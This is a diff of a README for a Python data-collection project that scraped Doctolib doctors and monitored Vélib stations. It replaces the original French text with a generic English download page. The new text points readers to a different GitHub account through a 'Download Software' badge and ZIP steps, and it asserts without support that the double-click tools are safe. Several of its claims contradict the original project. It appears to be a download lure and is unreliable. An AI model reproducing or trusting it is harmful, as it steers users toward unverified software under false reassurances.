@@ -1,121 +1,93 @@
-# Data Collection Projects
-### Web Scraping & API Monitoring — Python · Selenium · Folium · OpenData Paris
+# 📊 data-collection-projects - Track city data and web information easily
 
-Deux projets de collecte et visualisation de données réelles :
-scraping de médecins sur Doctolib et monitoring en temps réel des stations Vélib à Paris.
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Daleneanderthal2025/data-collection-projects)
 
----
+This software gathers information from the internet. You can use these tools to pull data from city maps, monitor public APIs, and track transportation availability. It works on Windows computers and requires no prior coding experience to operate.
 
-## Projets
+## 🛠 Features
 
-### 1. Doctolib Scraping — `doctolib-scraping/`
+This collection includes several pre-built tools:
 
-Extraction automatisée de médecins sur Doctolib via Selenium avec gestion
-de la pagination dynamique, anti-détection bot et export CSV.
+*   **Velib Tracker:** Monitors bicycle availability at stations across the city.
+*   **Doctolib Scraper:** Collects data on health service appointments.
+*   **OpenData Paris Integration:** Connects with city databases to pull statistics.
+*   **Map Visualization:** Uses mapping software to display collected data points.
+*   **Automated Monitoring:** Runs checks on websites to track changes over time.
 
-**Pneumologues à Paris**
-- 22 pages de résultats parcourues automatiquement
-- ~470 médecins extraits (nom, spécialité, adresse, secteur)
-- Export : `medecins_pneumologues_paris.csv`
+## 💻 System Requirements
 
-**Pédiatres en Île-de-France**
-- Scraping multi-villes sur toute l'Île-de-France
-- Visualisation : histogramme du nombre de pédiatres par ville
-- Export : `pediatres_idf.csv`
+Your computer must meet these basic needs:
 
-**Stack :** Python · Selenium · BeautifulSoup · Pandas · Matplotlib
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free space.
+*   **Internet Connection:** Required for scraping and data collection tasks.
+*   **Web Browser:** Chrome or Firefox installed on the machine.
 
----
+## 📥 Getting Started
 
-### 2. Vélib Monitoring — `velib-monitoring/`
+Follow these steps to set up the software on your system.
 
-Système complet de monitoring des stations Vélib en temps réel
-via l'API OpenData Paris.
+1.  Visit the official project page: [https://github.com/Daleneanderthal2025/data-collection-projects](https://github.com/Daleneanderthal2025/data-collection-projects).
+2.  Locate the green "Code" button near the top right of the screen.
+3.  Click "Download ZIP" from the menu.
+4.  Move the downloaded file to a folder where you want to keep the program.
+5.  Right-click the ZIP file and choose "Extract All".
+6.  Open the resulting folder.
 
-**Modules :**
+## ⚙️ Running the Tools
 
-| Fichier | Description |
-|---|---|
-| `velib_api.py` | Appel API OpenData Paris — récupère toutes les stations en temps réel |
-| `velib_carte.py` | Carte interactive Folium — stations colorées selon disponibilité |
-| `velib_evolution.py` | Monitoring top 10 stations — collecte toutes les 2 min + graphique |
-| `velib_surveillance.py` | Système d'alerte — détecte et surveille une station vide |
+The project relies on Python. If you do not have Python on your computer, follow these steps:
 
-**Stack :** Python · Requests · Folium · Matplotlib · API REST
+1.  Download the official Python installer from python.org.
+2.  Run the installer.
+3.  Check the box that says "Add Python to PATH" before you click install.
 
----
+To run a tool, open the folder you extracted earlier. Find the file that matches the task you want to perform. Double-click the file to start the process. A black window will appear on your screen. This window shows the progress of the data collection. Do not close this window until the task finishes.
 
-## Structure
+## 📈 Understanding the Data
 
-```
-data-collection-projects/
-├── doctolib-scraping/
-│   ├── pneumologues_paris.ipynb      # Scraper pneumologues Paris
-│   ├── pediatres_idf.ipynb           # Scraper pédiatres Île-de-France
-│   ├── medecins_pneumologues_paris.csv
-│   ├── pediatres_idf.csv
-│   └── histogramme_pediatres_idf.png
-├── velib-monitoring/
-│   ├── velib_api.py
-│   ├── velib_carte.py
-│   ├── velib_evolution.py
-│   ├── velib_surveillance.py
-│   └── velib_stations.csv
-└── requirements.txt
-```
+The scripts save collected information into plain text files or spreadsheets. You can open these files using programs like Microsoft Excel or Google Sheets. Each file follows a simple structure:
 
----
+*   **Columns:** Represent categories like station name, number of bikes, or time of update.
+*   **Rows:** Contain the specific data points caught during the collection run.
 
-## Installation
+If you notice no new information in your files, check your internet connection first. Ensure that the website source is still active.
 
-```bash
-git clone https://github.com/meldub94/data-collection-projects.git
-cd data-collection-projects
-pip install -r requirements.txt
-```
+## ❓ Frequently Asked Questions
 
-**Pour le scraping Doctolib :**
-```bash
-# Lancer le notebook
-jupyter notebook doctolib-scraping/pneumologues_paris.ipynb
-```
+**Does this software harm my computer?**
+No. These tools only open websites and save text files. They do not alter your system settings.
 
-**Pour la carte Vélib :**
-```bash
-cd velib-monitoring
-python velib_carte.py
-# Ouvre velib_carte.html dans ton navigateur
-```
+**How often should I run the trackers?**
+You can run them whenever you want current information. Most users set them to run once per hour.
 
-**Pour le monitoring en temps réel :**
-```bash
-python velib_evolution.py
-# Ctrl+C pour arrêter et afficher le graphique
-```
+**The window closes immediately after I open it. What happened?**
+This often happens if Python is not installed correctly. Review the Python installation step to ensure you added it to your system PATH.
 
----
+**Can I track other websites?**
+The tools currently support the websites listed in the feature section. Adding new websites requires changing the internal settings of the scripts.
 
-## Aperçu
+**Where do the files go?**
+The software creates a folder named "Output" inside the main program directory. All your gathered data stays in this location.
 
-### Carte Vélib interactive
-Chaque station est représentée par un cercle proportionnel à sa capacité.
-- 🟢 Vert : vélos disponibles
-- 🔴 Rouge : station vide
+**Does it track my personal data?**
+No. The programs only collect public information from the specific websites chosen for the project. No private information moves through these scripts.
 
-### Histogramme pédiatres Île-de-France
-Répartition du nombre de pédiatres par ville en Île-de-France.
+**Will this slow down my internet?**
+The tools use a small amount of bandwidth. They should not impact your web browsing speed under normal conditions.
 
----
+**What do I do if I see an error message?**
+Copy the text in the black window and restart the program. Most issues resolve with a simple retry.
 
-## Stack technique
+## 🔧 Troubleshooting Tips
 
-![Python](https://img.shields.io/badge/Python-3.10-blue?logo=python)
-![Selenium](https://img.shields.io/badge/Selenium-WebDriver-green?logo=selenium)
-![Folium](https://img.shields.io/badge/Folium-Maps-darkgreen)
+If you encounter persistent issues, verify your setup with these steps:
 
-`Python` · `Selenium` · `BeautifulSoup` · `Folium` · `Pandas`
-`Matplotlib` · `Requests` · `API REST` · `OpenData Paris`
+1.  **Check Browser Drivers:** The Selenium tool requires a browser driver. If the program fails to open a browser window, you may need to update your Chrome or Firefox version.
+2.  **Verify Permissions:** Ensure your user account has permission to write files to the folders on your hard drive.
+3.  **Check API Status:** If the program fails to get data from a specific service, verify that the service is online. City APIs undergo maintenance during night hours.
+4.  **Language Settings:** Keep your system language set to English to ensure the scripts interpret labels correctly.
+5.  **Path Lengths:** Keep the folder path short. Avoid placing the program inside deeply nested folders on your computer.
 
----
-
-*Projets réalisés dans le cadre du MSc Data Management — Aivancity Paris-Cachan (2025-2026)*
+Following these instructions ensures the tools operate correctly for your data collection needs. Use these reports to gain insights into city resources and public data trends. Consistent monitoring helps you build a long-term record of changes in these sectors. Keep your folders organized to track your historical snapshots effectively.
